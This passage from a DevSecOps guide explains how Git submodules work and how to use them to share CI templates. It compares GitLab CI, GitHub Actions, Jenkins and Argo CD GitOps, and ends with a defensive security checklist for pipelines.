- Change the default `admin` password (initially = the argocd-server pod name), enable SSO/RBAC.
- Webhook received from Git to sync immediately: verify the webhook secret to prevent forged triggers.

---

## 7.6. Git Submodule (sharing common templates)

### 7.6.1. What it is and its on-disk structure

A submodule lets you embed a (child) Git repo at a path within the parent repo, **pinned to a specific commit**. Two components:

1. **`.gitmodules`** — a text file at the parent repo's root, mapping path → URL:

```ini
[submodule "ci-templates"]
	path = ci-templates
	url = https://github.com/my-org/ci-templates.git
	branch = main
```

| Field | Meaning | Example |
|---|---|---|
| `path` | The directory where the submodule sits in the parent | `ci-templates` |
| `url` | The clone source | `https://.../ci-templates.git` |
| `branch` | The branch tracked when using `--remote` | `main` (optional) |

2. **gitlink** — an entry in the parent repo's tree at `path`, not an ordinary blob/tree but a pointer to a **commit SHA** (mode `160000`). This is the "pinning" mechanism.

View it with `git ls-tree`:

```
$ git ls-tree HEAD ci-templates
160000 commit 9b2c4f1a8d3e0c5b7f2a1d6e4c8b0a3f9d2e1c7b	ci-templates
```

`160000` is the special mode for a gitlink; it is followed by the commit SHA (40 hex = 160 bit) of the pinned child repo. The parent repo does **not** store the child repo's contents, only this commit pointer.

### 7.6.2. Commands and flow (step by step)

```bash
# Add a submodule
git submodule add https://github.com/my-org/ci-templates.git ci-templates
#  → creates/updates .gitmodules, clones the child repo into ci-templates/, stages the gitlink

# Clone a parent repo with submodules (submodules are empty by default)
git clone https://github.com/my-org/app.git
git submodule init        # reads .gitmodules → registers into .git/config
git submodule update      # clones/checks out the submodule at the pinned commit
# or combined:
git clone --recurse-submodules https://github.com/my-org/app.git

# Update the submodule to a new commit on the tracked branch
git submodule update --remote ci-templates
git add ci-templates       # stage the new gitlink (the new SHA pointer)
git commit -m "Bump ci-templates"
```

**The `git submodule update` flow, step by step:**
```
1. Read .git/config (path → url, already initialized)
2. For each submodule: read the gitlink SHA from the parent's index
3. Enter the child directory, fetch if that commit is missing
4. Check out exactly the commit SHA (detached HEAD) — NOT following a branch
```
By default the submodule is in a **detached HEAD** state at exactly the pinned SHA — this is a common source of confusion: pulling the parent repo does not automatically update the submodule unless you run `git submodule update`.

### 7.6.3. Why use it for shared templates & the drawbacks

**Why use it:** many projects (e.g., many microservices) share a common set of CI/CD templates, policies, and security scripts. Put the templates into a child repo and embed it as a submodule:
- Each project pins exactly the reviewed template version (the gitlink SHA) → **reproducible**, not subject to having its build broken by sudden template changes.
- Upgrading the template is a deliberate commit (changing the gitlink) → it goes through code review.

**Drawbacks / pitfalls:**

| Drawback | Detail |
|---|---|
| Detached HEAD causes confusion | Edits in the submodule are easily lost if not committed/pushed to the correct child repo |
| Two-step update | You must update the submodule **and** commit the gitlink in the parent — forgetting one step = drift |
| Complex clone | A newcomer forgets `--recurse-submodules` → missing files → build fails |
| Not atomic | Changing the child repo and the parent repo are two separate commits |

**Versus other options:** Git **subtree** (merges the child repo's history into the parent, no special commands needed when cloning), or an internal package manager (npm/pip private registry), or the CI `include` mechanism (GitLab `include: project:`). For CI templates, `include` from a central project is often cleaner than a submodule.

### 7.6.4. Submodule security notes

- **`url` points to a repo controlled by an external party:** if an attacker takes over the child repo, every parent that pulls the new commit will run malicious code — but because it is pinned by SHA, you are only affected when someone actively bumps it. Pin the SHA + review the submodule diff.
- **`.gitmodules` injection (historical CVEs):** there have been vulnerabilities where a submodule name/path containing special characters led to writing files outside the directory or executing hooks. Update to a recent Git; treat `.gitmodules` from untrusted sources as dangerous data.
- In CI, `--recurse-submodules` pulls third-party code into the build — treat it as a dependency: scan it, pin it, control the URL.

---

## 7.7. Comparison and when to use which tool

### 7.7.1. CI/CD engine comparison table

| Criterion | GitLab CI | GitHub Actions | Jenkins |
|---|---|---|---|
| Configuration | `.gitlab-ci.yml` (YAML) | `.github/workflows/*.yml` (YAML) | `Jenkinsfile` (Groovy) |
| SCM integration | GitLab native | GitHub native | SCM-agnostic (plugins) |
| Hosting | SaaS + self-managed | SaaS + self-hosted runner | Self-hosted |
| Runner model | Runner + executor | Runner (hosted/self) | Controller + agent |
| Reuse ecosystem | `include` templates, CI components | Marketplace actions | Plugins (very large, risky) |
| Secrets | CI/CD variables (masked/protected) | Secrets + OIDC | Credentials store |
| Strengths | All-in-one DevSecOps (integrated SAST/DAST) | Action ecosystem, smooth OIDC | Extremely flexible, long-established on-prem |
| Security weaknesses | Privileged/shared runners | `pull_request_target`, script injection | Plugin CVEs, Groovy sandbox bypass |

### 7.7.2. CI/CD push vs GitOps (Argo CD) — when to use which

| Situation | Choice |
|---|---|
| Build/test/package an artifact | A CI engine (GitLab CI / Actions / Jenkins) |
| Deploy to Kubernetes, needing drift detection + audit via Git | GitOps (Argo CD) |
| Deploy non-K8s targets (VM, serverless, mobile) | CI-push (Actions/GitLab/Jenkins) |
| Need cluster credentials to never leave the cluster | GitOps |
| The ideal modern model | CI builds & pushes the image → updates the manifest in the GitOps repo → Argo CD reconciles it onto the cluster |

**Recommended combined architecture pattern:**
```
[Code repo] --CI build/test/scan--> [Container Registry] (image @sha256:...)
     │
     └─ CI updates the image tag in the [GitOps repo] (commit)
                              │
                  Argo CD reconcile (pull)
                              ▼
                       [Kubernetes cluster]
```
Separation of duties: CI handles build & verify (with no cluster privilege), Argo handles deploy (with no credential leaving the cluster). This is the best separation of duties (SoD) for DevSecOps.

### 7.7.3. Cross-chapter security checklist

- Pin every third-party component by immutable digest/SHA (action, image `@sha256`, submodule gitlink).
- Least-privilege tokens: narrow GitLab `CI_JOB_TOKEN` scope, minimal GHA `permissions`, tightly pinned OIDC `sub`, AppProject restricting repos/clusters in Argo.
- Branch protection + required review for every repo containing pipeline-as-code and GitOps manifests (they = privileged code execution).
- Isolate runners/agents: not privileged, no shared docker.sock, ephemeral, no builds on the controller.
- Secret hygiene: masking is not sufficient control; do not log secrets, do not interpolate secrets into shell commands via an interpolation engine.
- Drift detection & self-heal (Argo) as a layer of defense against unauthorized cluster changes.
- Run SAST/SCA/secret-scan in the pipeline; block merges when there are critical findings.
